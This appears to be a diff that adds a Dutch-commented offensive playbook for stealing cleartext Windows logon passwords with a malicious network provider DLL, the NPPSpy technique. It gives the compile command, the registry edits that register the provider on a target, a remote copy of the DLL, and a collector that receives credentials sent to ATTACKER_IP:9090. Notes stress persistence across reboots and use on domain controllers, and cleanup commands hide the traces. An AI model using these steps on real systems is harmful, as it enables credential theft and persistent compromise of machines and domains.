@@ -1,0 +1,47 @@
+# Custom Network Provider — Cleartext credential harvesting via NPPSpy
+# Installeer een malicious network provider DLL die cleartext wachtwoorden onderschept bij login
+
+# === Context ===
+# Windows roept Network Providers aan bij interactive logon
+# Door een custom provider te registreren worden credentials doorgegeven aan je DLL
+# De DLL exfiltreert de cleartext wachtwoorden naar een remote server
+
+# === Stap 1: Compileer de DLL (op Linux/WSL) ===
+x86_64-w64-mingw32-gcc -shared -o KrbAuthX.dll KrbAuth.c -lwinhttp
+# KrbAuth.c implementeert NPLogonNotify() en stuurt creds via WinHTTP naar ATTACKER_IP:9090
+
+# === Stap 2: Registreer de network provider (op het doel, vereist admin) ===
+
+# Voeg toe aan de ProviderOrder lijst
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v "ProviderOrder" /t REG_SZ /d "RDPNP,LanmanWorkstation,KerberosAuthX" /f
+
+# Maak de service registry keys aan
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\KerberosAuthX\NetworkProvider" /v Class /t REG_DWORD /d 2 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\KerberosAuthX\NetworkProvider" /v Name /t REG_SZ /d KerberosAuthX /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\KerberosAuthX\NetworkProvider" /v ProviderPath /t REG_EXPAND_SZ /d ^%SystemRoot^%\KrbAuthX.dll /f
+
+# === Stap 3: Kopieer de DLL naar het doel ===
+echo F | xcopy KrbAuthX.dll \\TARGET\C$\Windows\KrbAuthX.dll /Y
+
+# === Stap 4: Start credential collector (op attacker machine) ===
+python3 credcollect.py
+# Luistert op poort 9090 voor inkomende credentials
+
+# === Stap 5: Wacht op login events ===
+# Bij elke interactive login (console, RDP, runas) worden credentials exfiltreerd
+
+# === Opruimen ===
+# Verwijder de DLL
+del \\TARGET\C$\Windows\KrbAuthX.dll
+
+# Verwijder registry keys
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\KerberosAuthX" /f
+
+# Herstel ProviderOrder (verwijder KerberosAuthX uit de lijst)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v "ProviderOrder" /t REG_SZ /d "RDPNP,LanmanWorkstation" /f
+
+# Noot: Werkt op DCs en werkstations
+# Noot: Overleeft reboots (persistent via registry)
+# Noot: Cleartext wachtwoorden — ook als WDigest is uitgeschakeld
+# Noot: Vereist local admin/SYSTEM om te installeren
+# Noot: NPPSpy bron: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
